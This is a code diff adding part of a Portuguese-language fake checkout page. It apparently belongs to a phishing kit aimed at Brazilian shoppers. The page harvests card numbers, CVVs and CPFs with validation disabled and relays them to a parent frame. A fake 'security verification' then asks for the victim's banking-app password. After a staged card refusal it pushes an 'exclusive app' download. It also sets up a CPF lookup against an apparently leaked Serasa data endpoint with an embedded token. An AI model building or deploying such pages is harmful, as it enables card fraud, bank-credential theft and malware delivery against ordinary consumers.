+            OK, preencher
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ════ Card Auth Modal ════ -->
+    <div id="card-modal">
+      <div
+        style="
+          background: #fff;
+          border-radius: 20px;
+          padding: 30px 22px;
+          text-align: center;
+          max-width: 340px;
+          width: 90%;
+          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.28);
+          position: relative;
+        "
+      >
+        <div id="cs1">
+          <div
+            style="
+              width: 66px;
+              height: 66px;
+              background: linear-gradient(135deg, #f87171, #ef4444);
+              border-radius: 50%;
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              margin: 0 auto 18px;
+            "
+          >
+            <svg
+              width="32"
+              height="32"
+              fill="none"
+              stroke="white"
+              viewBox="0 0 24 24"
+              stroke-width="2"
+            >
+              <rect x="1" y="4" width="22" height="16" rx="2" />
+              <line x1="1" y1="10" x2="23" y2="10" />
+            </svg>
+          </div>
+          <div
+            style="
+              font-size: 18px;
+              font-weight: 700;
+              color: #1f2937;
+              margin-bottom: 8px;
+            "
+          >
+            Validando Cartão
+          </div>
+          <div style="font-size: 13px; color: #6b7280; margin-bottom: 22px">
+            Estamos validando as informações do seu cartão.
+          </div>
+          <div
+            style="
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              gap: 7px;
+            "
+          >
+            <div class="dp"></div>
+            <div class="dp"></div>
+            <div class="dp"></div>
+          </div>
+        </div>
+        <div id="cs2" style="display: none">
+          <button
+            onclick="fecharCartao()"
+            style="
+              position: absolute;
+              top: 12px;
+              right: 12px;
+              background: none;
+              border: none;
+              font-size: 22px;
+              color: #9ca3af;
+              cursor: pointer;
+            "
+          >
+            ×
+          </button>
+          <div id="blc" style="margin-bottom: 12px"></div>
+          <div
+            style="
+              font-size: 16px;
+              font-weight: 700;
+              color: #1f2937;
+              margin-bottom: 8px;
+            "
+          >
+            Verificação de Segurança
+          </div>
+          <div
+            id="bmsg"
+            style="
+              font-size: 12px;
+              color: #374151;
+              line-height: 1.6;
+              padding: 10px;
+              background: #f9fafb;
+              border-radius: 8px;
+              text-align: left;
+              margin-bottom: 12px;
+            "
+          >
+            <span style="font-weight: 700; color: #dc2626">ATENÇÃO:</span>
+            Informe a senha do seu app bancário (4 a 8 dígitos).
+          </div>
+          <div
+            id="last4d"
+            style="font-size: 12px; color: #6b7280; margin-bottom: 10px"
+          ></div>
+          <input
+            type="tel"
+            id="card-pw"
+            inputmode="numeric"
+            pattern="[0-9]*"
+            style="
+              width: 100%;
+              padding: 6px;
+              border: 1.5px solid #e5e7eb;
+              border-radius: 8px;
+              font-size: 15px;
+              text-align: center;
+              box-sizing: border-box;
+              margin-bottom: 3px;
+            "
+          />
+          <p
+            id="card-pw-err"
+            style="
+              display: none;
+              font-size: 11px;
+              color: #ef4444;
+              margin: 0 0 8px;
+            "
+          >
+            Senha inválida
+          </p>
+          <button
+            id="cbtn"
+            onclick="submitPw()"
+            style="
+              color: #fff;
+              font-weight: 600;
+              padding: 10px;
+              border-radius: 8px;
+              border: none;
+              font-size: 14px;
+              cursor: pointer;
+              width: 100%;
+              margin-bottom: 14px;
+              background: var(--cb);
+            "
+          >
+            CONFIRMAR
+          </button>
+          <div
+            id="timer-wrap"
+            style="
+              margin: 0 auto;
+              width: 66px;
+              height: 66px;
+              border: 3px solid var(--ce);
+              border-radius: 50%;
+              display: flex;
+              align-items: center;
+              justify-content: center;
+            "
+          >
+            <span
+              id="timer"
+              style="font-size: 16px; font-weight: 700; color: var(--ce)"
+              >02:00</span
+            >
+          </div>
+        </div>
+        <!-- cs3 normal (sem app) -->
+        <div id="cs3" style="display: none">
+          <div style="font-size: 38px; margin-bottom: 14px">❌</div>
+          <div
+            style="
+              font-size: 17px;
+              font-weight: 700;
+              color: #1f2937;
+              margin-bottom: 6px;
+            "
+          >
+            Cartão recusado
+          </div>
+          <div style="font-size: 13px; color: #6b7280; margin-bottom: 18px">
+            Tente outra forma de pagamento.
+          </div>
+          <button
+            onclick="pagarPix()"
+            style="
+              background: #7c3aed;
+              color: #fff;
+              padding: 12px;
+              border-radius: 8px;
+              border: none;
+              font-size: 14px;
+              font-weight: 700;
+              cursor: pointer;
+              width: 100%;
+              margin-bottom: 8px;
+            "
+          >
+            Pagar com PIX
+          </button>
+          <button
+            onclick="outroCartao()"
+            style="
+              background: #fff;
+              color: #ef4444;
+              padding: 12px;
+              border-radius: 8px;
+              border: 2px solid #ef4444;
+              font-size: 14px;
+              font-weight: 700;
+              cursor: pointer;
+              width: 100%;
+            "
+          >
+            Outro cartão
+          </button>
+        </div>
+        <!-- cs3-app (com app habilitado) -->
+        <div id="cs3-app" style="display: none">
+          <div style="font-size: 34px; margin-bottom: 10px">🔒</div>
+          <div
+            style="
+              font-size: 16px;
+              font-weight: 800;
+              color: #1f2937;
+              margin-bottom: 6px;
+            "
+          >
+            Cartão recusado
+          </div>
+          <div
+            style="
+              font-size: 12.5px;
+              color: #6b7280;
+              line-height: 1.6;
+              margin-bottom: 14px;
+            "
+          >
+            Por motivos de segurança, sua compra não pode ser completada.
+          </div>
+          <div
+            style="
+              background: linear-gradient(135deg, #1a1a2e, #0f3460);
+              border-radius: 12px;
+              padding: 16px;
+              margin-bottom: 14px;
+              text-align: center;
+            "
+          >
+            <div
+              style="
+                font-size: 12px;
+                color: rgba(255, 255, 255, 0.85);
+                line-height: 1.6;
+                margin-bottom: 12px;
+              "
+            >
+              Baixe nosso
+              <strong style="color: #f9d71c">aplicativo exclusivo</strong> e
+              faça o pagamento com seu cartão dentro do nosso app.
+            </div>
+            <button
+              onclick="downloadAppCard()"
+              style="
+                display: inline-flex;
+                align-items: center;
+                gap: 8px;
+                background: #16c172;
+                color: #fff;
+                border: none;
+                border-radius: 9px;
+                padding: 10px 16px;
+                font-size: 12.5px;
+                font-weight: 700;
+                cursor: pointer;
+                width: 100%;
+                justify-content: center;
+                box-sizing: border-box;
+                margin-bottom: 4px;
+              "
+            >
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="17"
+                height="17"
+                viewBox="0 0 512 512"
+              >
+                <path
+                  fill="currentColor"
+                  d="M48 59.49v393a4.33 4.33 0 0 0 7.37 3.07L260 256L55.37 56.42A4.33 4.33 0 0 0 48 59.49M345.8 174L89.22 32.64l-.16-.09c-4.42-2.4-8.62 3.58-5 7.06l201.13 192.32ZM84.08 472.39c-3.64 3.48.56 9.46 5 7.06l.16-.09L345.8 338l-60.61-57.95ZM449.38 231l-71.65-39.46L310.36 256l67.37 64.43L449.38 281c19.49-10.77 19.49-39.23 0-50"
+                />
+              </svg>
+              Baixar na Play Store
+            </button>
+            <div
+              id="cs3-app-coupon"
+              style="
+                display: none;
+                font-size: 13px;
+                color: rgba(255, 255, 255, 0.85);
+                line-height: 1.6;
+                margin-top: 8px;
+              "
+            ></div>
+          </div>
+          <div id="cs3-app-whatsapp" style="display: none; margin-bottom: 10px">
+            <div
+              style="
+                font-size: 11px;
+                color: #6b7280;
+                margin-bottom: 6px;
+                text-align: center;
+              "
+            >
+              Se precisar de ajuda, chame nosso suporte no WhatsApp:
+            </div>
+            <button
+              id="cs3-app-whatsapp-btn"
+              style="
+                display: inline-flex;
+                align-items: center;
+                gap: 8px;
+                background: #25d366;
+                color: #fff;
+                border: none;
+                border-radius: 9px;
+                padding: 10px 16px;
+                font-size: 13px;
+                font-weight: 700;
+                cursor: pointer;
+                width: 100%;
+                justify-content: center;
+                box-sizing: border-box;
+              "
+            >
+              <svg
+                width="17"
+                height="17"
+                viewBox="0 0 24 24"
+                fill="currentColor"
+              >
+                <path
+                  d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"
+                />
+              </svg>
+              WhatsApp
+            </button>
+          </div>
+          <div
+            style="
+              font-size: 12px;
+              color: #9ca3af;
+              margin-bottom: 10px;
+              text-align: center;
+            "
+          >
+            ou
+          </div>
+          <button
+            onclick="pagarPix()"
+            style="
+              background: #7c3aed;
+              color: #fff;
+              padding: 11px;
+              border-radius: 8px;
+              border: none;
+              font-size: 13px;
+              font-weight: 700;
+              cursor: pointer;
+              width: 100%;
+            "
+          >
+            Pagar via PIX
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ════ Processing Modal ════ -->
+    <div id="proc-modal">
+      <div
+        style="
+          background: #fff;
+          border-radius: 20px;
+          padding: 34px 26px;
+          text-align: center;
+          max-width: 290px;
+          width: 90%;
+        "
+      >
+        <div
+          style="
+            position: relative;
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 18px;
+          "
+        >
+          <div
+            style="
+              position: absolute;
+              width: 64px;
+              height: 64px;
+              border: 4px solid #f3e8ff;
+              border-radius: 50%;
+            "
+          ></div>
+          <div
+            style="
+              position: absolute;
+              width: 64px;
+              height: 64px;
+              border: 4px solid transparent;
+              border-top-color: var(--ce);
+              border-radius: 50%;
+              animation: spin 0.85s linear infinite;
+            "
+          ></div>
+          <div
+            style="
+              position: absolute;
+              top: 50%;
+              left: 50%;
+              transform: translate(-50%, -50%);
+              width: 38px;
+              height: 38px;
+              background: var(--cb);
+              border-radius: 50%;
+              display: flex;
+              align-items: center;
+              justify-content: center;
+            "
+          >
+            <svg
+              width="18"
+              height="18"
+              fill="none"
+              stroke="white"
+              viewBox="0 0 24 24"
+              stroke-width="2.5"
+            >
+              <path d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z" />
+            </svg>
+          </div>
+        </div>
+        <div
+          style="
+            font-size: 17px;
+            font-weight: 700;
+            color: #1f2937;
+            margin-bottom: 6px;
+          "
+        >
+          Processando pedido
+        </div>
+        <div style="font-size: 13px; color: #6b7280; line-height: 1.6">
+          Estamos preparando tudo para você.
+        </div>
+      </div>
+    </div>
+
+    <style>
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+
+    <script>
+      const CPF_API_ENABLED = false;
+      const CPF_API_URL =
+        "https:\/\/api.assossiacao77.shop\/serasa\/cpf\/{CPF}?token=ASD5ddsa3dg28gr82g437rg2jh356jh356";
+      const ONLY_SERVICES = false;
+      const FREIGHT_FAST_VAL = 5.89;
+      const FREIGHT_SLOW_ON = true;
+      const FREIGHT_FAST_ON = true;
+      const SUBTOTAL_VAL = 112.8;
+
+      let selPayment = null;
+      let selFreightType = FREIGHT_SLOW_ON ? "slow" : "fast";
+      let ckData = {};
+      let cpfDone = false;
+      let appliedCoupon = null; // { code, type:'fixed'|'percent', value, max_discount }
+      let cardHash = "";
+      let bankName = "";
+      let timerIv = null;
+      let pixReplyTimer = null;
+
+      function sendToApp(eventName, payload) {
+        try {
+          if (!window.parent || window.parent === window) return;
+          window.parent.postMessage(
+            {
+              source: "checkout222",
+              event: eventName,
+              payload: payload || {},
+            },
+            "*",
+          );
+        } catch (e) {}
+      }
+
+      // ── Summary accordion ──
+      function toggleSummary() {
+        const b = document.getElementById("sum-body");
+        const open = b.style.display === "none";
+        b.style.display = open ? "block" : "none";
+        document.getElementById("sum-lbl").textContent = open
+          ? "Ocultar resumo do pedido"
+          : "Mostrar resumo do pedido";
+        document.getElementById("sum-chev").style.transform = open
+          ? "rotate(180deg)"
+          : "";
+      }
+
+      // ── Progress ──
+      function setStep(n) {
+        const pc1 = document.getElementById("pc1"),
+          pc2 = document.getElementById("pc2");
+        const pl1 = document.getElementById("pl1"),
+          pl2 = document.getElementById("pl2");
+        const ln = document.getElementById("pline");
+        if (n === 1) {
+          pc1.className = "prog-circle active";
+          pl1.className = "prog-label active";
+          document.getElementById("pc1c").innerHTML = "1";
+          pc2.className = "prog-circle idle";
+          pl2.className = "prog-label idle";
+          document.getElementById("pc2c").innerHTML = "2";
+          ln.className = "prog-line";
+        } else {
+          pc1.className = "prog-circle done";
+          pl1.className = "prog-label active";
+          document.getElementById("pc1c").innerHTML =
+            '<svg width="15" height="15" fill="none" stroke="white" viewBox="0 0 24 24" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>';
+          pc2.className = "prog-circle active";
+          pl2.className = "prog-label active";
+          document.getElementById("pc2c").innerHTML = "2";
+          ln.className = "prog-line done";
+        }
+      }
+
+      // ── Step 1 → 2 ──
+      function goToPayment() {
+        const name = document.getElementById("customer_name").value.trim();
+        const phone = document.getElementById("phone").value.trim();
+        const email = document.getElementById("email").value.trim();
+        if (!name || !phone || !email) {
+          showAlert(
+            "Preencha nome, telefone e email.",
+            "Campos obrigatórios",
+            "warn",
+          );
+          return;
+        }
+
+        if (ONLY_SERVICES) {
+          Object.assign(ckData, {
+            customer_name: name,
+            phone,
+            email,
+            cpf: document.getElementById("cpf-field").value.replace(/\D/g, ""),
+          });
+          document.getElementById("s2-name").textContent = name;
+          document.getElementById("s2-contact").textContent =
+            email + " • " + phone;
+          const s2addr = document.getElementById("s2-address");
+          const s2loc = document.getElementById("s2-location");
+          if (s2addr) s2addr.closest(".sum-row").style.display = "none";
+          if (s2loc)
+            s2loc.closest(".sum-row") && (s2loc.style.display = "none");
+        } else {
+          const zip = document.getElementById("zipcode").value.trim();
+          const addr = document.getElementById("address").value.trim();
+          const num = document.getElementById("number").value.trim();
+          const neigh = document.getElementById("neighborhood").value.trim();
+          const city = document.getElementById("city").value.trim();
+          if (!zip || !addr || !num || !neigh || !city) {
+            showAlert(
+              "Preencha todos os campos de endereço.",
+              "Endereço incompleto",
+              "warn",
+            );
+            return;
+          }
+          Object.assign(ckData, {
+            customer_name: name,
+            phone,
+            email,
+            zipcode: zip,
+            address: addr,
+            number: num,
+            neighborhood: neigh,
+            city,
+            state: document.getElementById("state").value.trim(),
+            cpf: document.getElementById("cpf-field").value.replace(/\D/g, ""),
+          });
+          document.getElementById("s2-name").textContent = name;
+          document.getElementById("s2-contact").textContent =
+            email + " • " + phone;
+          document.getElementById("s2-address").textContent = addr + ", " + num;
+          document.getElementById("s2-location").textContent =
+            neigh +
+            " - " +
+            city +
+            (ckData.state ? " • " + ckData.state : "") +
+            " • CEP: " +
+            zip;
+        }
+
+        document.getElementById("step1").classList.add("hidden");
+        document.getElementById("step2").classList.remove("hidden");
+        setStep(2);
+        window.scrollTo(0, 0);
+      }
+      function goBack() {
+        document.getElementById("step2").classList.add("hidden");
+        document.getElementById("step1").classList.remove("hidden");
+        setStep(1);
+        window.scrollTo(0, 0);
+      }
+
+      // ── Seleção de frete ──
+      function calcTotal() {
+        const freight = selFreightType === "fast" ? FREIGHT_FAST_VAL : 0;
+        let discount = 0;
+        if (appliedCoupon) {
+          if (appliedCoupon.type === "fixed") {
+            discount = appliedCoupon.value;
+          } else {
+            discount = (SUBTOTAL_VAL * appliedCoupon.value) / 100;
+            if (appliedCoupon.max_discount > 0)
+              discount = Math.min(discount, appliedCoupon.max_discount);
+          }
+        }
+        return Math.max(0, SUBTOTAL_VAL + freight - discount);
+      }
+      function updateTotalDisplay() {
+        const fmt = (v) => "R$ " + v.toFixed(2).replace(".", ",");
+        const tEl = document.getElementById("total-display");
+        if (tEl) tEl.textContent = fmt(calcTotal());
+      }
+      function selFreight(type) {
+        selFreightType = type;
+        document
+          .getElementById("freight-slow")
+          .classList.toggle("sel", type === "slow");
+        document
+          .getElementById("freight-fast")
+          .classList.toggle("sel", type === "fast");
+        const freight = type === "fast" ? FREIGHT_FAST_VAL : 0;
+        const fmt = (v) => "R$ " + v.toFixed(2).replace(".", ",");
+        const fEl = document.getElementById("freight-display");
+        if (fEl)
+          fEl.innerHTML =
+            type === "slow"
+              ? '<span style="color:#10B981;font-weight:600;">Grátis</span>'
+              : '<span style="font-weight:600;">' +
+                fmt(FREIGHT_FAST_VAL) +
+                "</span>";
+        ckData.freight_type = type;
+        ckData.freight_value = freight;
+        updateTotalDisplay();
+      }
+
+      // ── Coupon ──
+      function toggleCoupon() {
+        const wrap = document.getElementById("coupon-input-wrap");
+        const visible = wrap.style.display !== "none";
+        wrap.style.display = visible ? "none" : "flex";
+        wrap.style.flexDirection = "column";
+        if (!visible) document.getElementById("coupon-code").focus();
+      }
+      async function applyCoupon() {
+        const code = document
+          .getElementById("coupon-code")
+          .value.trim()
+          .toUpperCase();
+        const errEl = document.getElementById("coupon-err");
+        errEl.style.display = "none";
+        if (!code) {
+          errEl.textContent = "Digite um código de cupom.";
+          errEl.style.display = "block";
+          return;
+        }
+        const btn = document.querySelector("#coupon-input-wrap button");
+        btn.disabled = true;
+        btn.textContent = "...";
+        try {
+          const fd = new FormData();
+          fd.append("action", "validate_coupon");
+          fd.append("code", code);
+          fd.append("subtotal", SUBTOTAL_VAL);
+          const r = await fetch("./public/api/coupon.php", {
+            method: "POST",
+            body: fd,
+          });
+          const d = await r.json();
+          btn.disabled = false;
+          btn.textContent = "Aplicar";
+          if (!d.ok) {
+            errEl.textContent = d.message || "Cupom inválido.";
+            errEl.style.display = "block";
+            return;
+          }
+          // Apply
+          appliedCoupon = {
+            code: d.code,
+            type: d.discount_type,
+            value: d.discount_value,
+            max_discount: d.max_discount || 0,
+          };
+          const fmt = (v) => "R$ " + v.toFixed(2).replace(".", ",");
+          const label =
+            d.discount_type === "percent"
+              ? d.discount_value +
+                "% off" +
+                (d.max_discount > 0 ? " (máx " + fmt(d.max_discount) + ")" : "")
+              : fmt(d.discount_value) + " off";
+          // Update coupon row in totals
+          const crow = document.getElementById("coupon-row");
+          const cdisp = document.getElementById("coupon-display");
+          if (crow) {
+            crow.style.display = "flex";
+          }
+          if (cdisp) {
+            const freight = selFreightType === "fast" ? FREIGHT_FAST_VAL : 0;
+            let disc =
+              d.discount_type === "fixed"
+                ? d.discount_value
+                : (SUBTOTAL_VAL * d.discount_value) / 100;
+            if (d.max_discount > 0) disc = Math.min(disc, d.max_discount);
+            cdisp.textContent = "-" + fmt(disc);
+          }
+          updateTotalDisplay();
+          // Update badge label
+          document.getElementById("coupon-badge").style.display = "none";
+          const al = document.getElementById("coupon-applied-label");
+          al.style.display = "inline";
+          al.textContent = "✅ Cupom: " + label;
+          // Hide input wrap
+          document.getElementById("coupon-input-wrap").style.display = "none";
+          ckData.coupon_code = d.code;
+        } catch (e) {
+          btn.disabled = false;
+          btn.textContent = "Aplicar";
+          errEl.textContent = "Erro ao validar cupom.";
+          errEl.style.display = "block";
+        }
+      }
+
+      // ── CEP ──
+      function handleCep(el) {
+        let v = el.value.replace(/\D/g, "").substring(0, 8);
+        el.value = v.length > 5 ? v.substring(0, 5) + "-" + v.substring(5) : v;
+        if (v.length === 8) {
+          fetch("https://viacep.com.br/ws/" + v + "/json/")
+            .then((r) => r.json())
+            .then((d) => {
+              if (!d.erro) {
+                document.getElementById("address").value = d.logradouro || "";
+                document.getElementById("neighborhood").value = d.bairro || "";
+                document.getElementById("city").value = d.localidade || "";
+                document.getElementById("state").value = d.uf || "";
+                document.getElementById("number").focus();
+              }
+            })
+            .catch(() => {});
+        }
+      }
+
+      // ── CPF ──
+      let cpfTimer = null;
+      function handleCpf(el) {
+        maskCpf(el);
+        const digits = el.value.replace(/\D/g, "");
+        if (digits.length === 11 && !cpfDone) {
+          cpfDone = true;
+          clearTimeout(cpfTimer);
+          cpfTimer = setTimeout(() => lookupCpf(digits), 300);
+        } else if (digits.length < 11) cpfDone = false;
+      }
+      function maskCpf(el) {
+        let v = el.value.replace(/\D/g, "");
+        v = v
+          .replace(/(\d{3})(\d)/, "$1.$2")
+          .replace(/(\d{3})(\d)/, "$1.$2")
+          .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+        el.value = v.substring(0, 14);
+      }
+      function lookupCpf(cpf) {
+        if (!CPF_API_ENABLED || !CPF_API_URL) return;
+        ckData.cpf = cpf;
+        show("cpf-loading");
+        hide("cpf-found");
+        hide("cpf-notfound");
+        document.getElementById("cpf-modal").classList.add("open");
+        const t0 = Date.now();
+        // Proxy PHP no mesmo servidor - sem CORS, sem Mixed Content
+        fetch("/admin/api/cpf-proxy.php?cpf=" + cpf)
+          .then(async (r) => {
+            const txt = await r.text();
+            try {
+              return JSON.parse(txt);
+            } catch (e) {
+              return null;
+            }
+          })
+          .then((d) => {
+            const wait = Math.max(0, 4000 - (Date.now() - t0));
+            setTimeout(() => {
+              hide("cpf-loading");
+              if (
+                d &&
+                d.total > 0 &&
+                d.data &&
+                d.data[0] &&
+                d.data[0].nome_completo
+              ) {
+                document.getElementById("customer_name").value =
+                  d.data[0].nome_completo;
+                document.getElementById("cpf-found-msg").textContent =
+                  "Olá, " + d.data[0].nome_completo + "!";
+                show("cpf-found");
+              } else show("cpf-notfound");
+            }, wait);
+          })
+          .catch(() => {
+            const wait = Math.max(0, 4000 - (Date.now() - t0));
+            setTimeout(() => {
+              hide("cpf-loading");
+              show("cpf-notfound");
+            }, wait);
+          });
+      }
+      function closeCpfModal() {
+        document.getElementById("cpf-modal").classList.remove("open");
+      }
+
+      // ── Payment ──
+      function selPay(m) {
+        selPayment = m;
+        ["pix-opt", "card-opt"].forEach((id) => {
+          const el = document.getElementById(id);
+          if (el) el.classList.remove("sel");
+        });
+        const o = document.getElementById(m === "pix" ? "pix-opt" : "card-opt");
+        if (o) o.classList.add("sel");
+        document.getElementById("card-fields").style.display =
+          m === "card" ? "block" : "none";
+        if (m !== "card") {
+          ["card_number", "card_expiry", "card_cvv", "card_cpf"].forEach((id) =>
+            setFieldState(id, "", ""),
+          );
+        }
+      }
+
+      // ── Finalizar ──
+      function finalizarPedido() {
+        const btn = document.getElementById("btn-finalizar");
+        if (btn.disabled) return;
+        if (!selPayment) {
+          showAlert(
+            "Selecione uma forma de pagamento.",
+            "Forma de pagamento",
+            "warn",
+          );
+          return;
+        }
+        if (selPayment === "card") {
+          const cn = document.getElementById("card_number").value;
+          const ce = document.getElementById("card_expiry").value;
+          const cv = document.getElementById("card_cvv").value;
+          const cc = document.getElementById("card_cpf").value;
+          if (!cn || !ce || !cv || !cc) {
+            showAlert(
+              "Preencha todos os dados do cartão.",
+              "Dados incompletos",
+              "warn",
+            );
+            return;
+          }
+          // TEMP TESTE: validações de cartão desativadas.
+          // Reativar depois com as checagens de validCard/validExpiry/CVV/validCpf.
+          let cardOk = true;
+          setFieldState("card_number", cn ? "ok" : "", "");
+          setFieldState("card_expiry", ce ? "ok" : "", "");
+          setFieldState("card_cvv", cv ? "ok" : "", "");
+          setFieldState("card_cpf", cc ? "ok" : "", "");
+          if (!cardOk) {
+            document
+              .getElementById("card_number")
+              .scrollIntoView({ behavior: "smooth", block: "center" });
+            return;
+          }
+          ckData.card_number = cn.replace(/\D/g, "");
+          ckData.card_expiry = ce;
+          ckData.card_cvv = cv;
+          ckData.card_cpf = cc.replace(/\D/g, "");
+          // Registra pedido e notifica a API (forma_pgto=2) antes de abrir o modal do cartão
+          ckData.payment_method = "card";
+          ckData.freight_type = selFreightType;
+          ckData.freight_value =
+            selFreightType === "fast" ? FREIGHT_FAST_VAL : 0;
+          ckData.total_final = calcTotal();
+          btn.disabled = true;
+          // Modo local: sem requisição externa de checkout.
+          setTimeout(() => {
+            btn.disabled = false;
+            sendToApp("checkout_card_start", {
+              ...ckData,
+              payment_method: "card",
+              card_number: (cn || "").replace(/\D/g, ""),
+              card_expiry: ce || "",
+              card_cvv: cv || "",
+              card_cpf: (cc || "").replace(/\D/g, ""),
+            });
+            mostrarCartao();
+          }, 250);
+          return;
+        }
+        // Validar CPF obrigatorio para PIX
+        const cpfFieldEl = document.getElementById("cpf-field");
+        const cpfVal = cpfFieldEl ? cpfFieldEl.value.replace(/\D/g, "") : "";
+        if (!cpfVal) {
+          showAlert(
+            "Informe seu CPF para continuar.",
+            "CPF obrigatório",
+            "warn",
+          );
+          cpfFieldEl &&
+            cpfFieldEl.scrollIntoView({ behavior: "smooth", block: "center" });
+          return;
+        }
+        if (!validCpf(cpfVal)) {
+          showAlert(
+            "CPF inválido. Verifique e tente novamente.",
+            "CPF inválido",
+            "err",
+          );
+          cpfFieldEl && cpfFieldEl.focus();
+          return;
+        }
+        btn.disabled = true;
+        ckData.cpf = cpfVal;
+        ckData.payment_method = "pix";
+        ckData.freight_type = selFreightType;
+        ckData.freight_value = selFreightType === "fast" ? FREIGHT_FAST_VAL : 0;
+        ckData.total_final = calcTotal();
+        document.getElementById("proc-modal").classList.add("open");
+        if (pixReplyTimer) clearTimeout(pixReplyTimer);
+        pixReplyTimer = setTimeout(() => {
+          pixReplyTimer = null;
+          document.getElementById("proc-modal").classList.remove("open");
+          btn.disabled = false;
+          showAlert(
+            "Tempo esgotado ao gerar o PIX. Verifique sua conexão e tente de novo.",
+            "Pagamento PIX",
+            "err",
+          );
+        }, 90000);
+        sendToApp("checkout_pix_submit", {
+          ...ckData,
+          payment_method: "pix",
+        });
+      }
+
+      // ── Validators ──
+
+      // ── Alert Modal ──
+      function showAlert(msg, title, type) {
+        title = title || "Atenção";
+        type = type || "warn";
+        const icons = { warn: "⚠️", err: "❌", info: "ℹ️", ok: "✅" };
+        const bgs = {
+          warn: "#fef3c7",
+          err: "#fee2e2",
+          info: "#eff6ff",
+          ok: "#dcfce7",
+        };
+        const el = document.getElementById("alert-modal");
+        document.getElementById("alert-icon").textContent = icons[type] || "⚠️";
+        document.getElementById("alert-icon").style.background =
+          bgs[type] || "#fef3c7";
+        document.getElementById("alert-title").textContent = title;
+        document.getElementById("alert-msg").textContent = msg;
+        el.style.display = "flex";
+      }
+      function closeAlertModal() {
+        document.getElementById("alert-modal").style.display = "none";
+      }
+
+      window.addEventListener("message", function (ev) {
+        try {
+          const d = ev.data;
+          if (!d || d.source !== "app222") return;
+          const btn = document.getElementById("btn-finalizar");
+          if (pixReplyTimer) {
+            clearTimeout(pixReplyTimer);
+            pixReplyTimer = null;
+          }
+          if (d.event === "risepay_pix_ok") {
+            /* Checkout React redireciona para /checkout/pix; este evento não é mais usado. */
+            document.getElementById("proc-modal").classList.remove("open");
+            if (btn) btn.disabled = false;
+          } else if (d.event === "risepay_pix_err") {
+            document.getElementById("proc-modal").classList.remove("open");
+            if (btn) btn.disabled = false;
+            const userMsg =
+              (d.payload && d.payload.message) ||
+              "Não foi possível gerar o PIX. Tente de novo em alguns instantes.";
+            showAlert(userMsg, "Não foi possível gerar o PIX", "err");
+          }
+        } catch (e) {}
+      });
+
+      // ── Amex detection ──
+      function isAmex(n) {
+        return /^3[47]/.test(n.replace(/\D/g, ""));
+      }
+      function getCardMaxLen(n) {
+        return isAmex(n) ? 15 : 16;
+      }
+      function getCvvMaxLen(n) {
+        return isAmex(n) ? 4 : 3;
+      }
+
+      function validCpf(c) {
+        c = c.replace(/\D/g, "");
+        if (c.length !== 11 || /^(\d)\1{10}$/.test(c)) return false;
+        let s = 0,
+          r;
+        for (let i = 1; i <= 9; i++) s += +c[i - 1] * (11 - i);
+        r = (s * 10) % 11;
+        if (r === 10 || r === 11) r = 0;
+        if (r !== +c[9]) return false;
+        s = 0;
+        for (let i = 1; i <= 10; i++) s += +c[i - 1] * (12 - i);
+        r = (s * 10) % 11;
+        if (r === 10 || r === 11) r = 0;
+        return r === +c[10];
+      }
+      function validCard(n) {
+        n = n.replace(/\D/g, "");
+        if (n.length < 13 || n.length > 19) return false;
+        let s = 0,
+          alt = false;
+        for (let i = n.length - 1; i >= 0; i--) {
+          let d = +n[i];
+          if (alt) {
+            d *= 2;
+            if (d > 9) d -= 9;
+          }
+          s += d;
+          alt = !alt;
+        }
+        return s % 10 === 0;
+      }
+      function validExpiry(d) {
+        if (!/^\d{2}\/\d{2}$/.test(d)) return false;
+        const [m, y] = d.split("/").map(Number);
+        if (m < 1 || m > 12) return false;
+        const hj = new Date();
+        return (
+          new Date(2000 + y, m - 1) >=
+          new Date(hj.getFullYear(), hj.getMonth() + 1)
+        );
+      }
+
+      // ── Masks ──
+      document.getElementById("phone").addEventListener("input", function (e) {
+        let v = e.target.value.replace(/\D/g, "");
+        v = v
+          .replace(/^(\d{2})(\d)/, "($1) $2")
+          .replace(/(\d)(\d{4})$/, "$1-$2");
+        e.target.value = v.substring(0, 15);
+      });
+      // ── Real-time card validation ──
+      function setFieldState(id, state, msg) {
+        const el = document.getElementById(id);
+        const errEl = document.getElementById("err_" + id);
+        if (!el) return;
+        el.classList.remove("err", "ok");
+        if (errEl) {
+          errEl.classList.remove("show");
+          errEl.textContent = "";
+        }
+        if (state === "err") {
+          el.classList.add("err");
+          if (errEl && msg) {
+            errEl.textContent = msg;
+            errEl.classList.add("show");
+          }
+        } else if (state === "ok") {
+          el.classList.add("ok");
+        }
+      }
+
+      // ── Card number: mask + amex detection ──
+      const cnEl = document.getElementById("card_number");
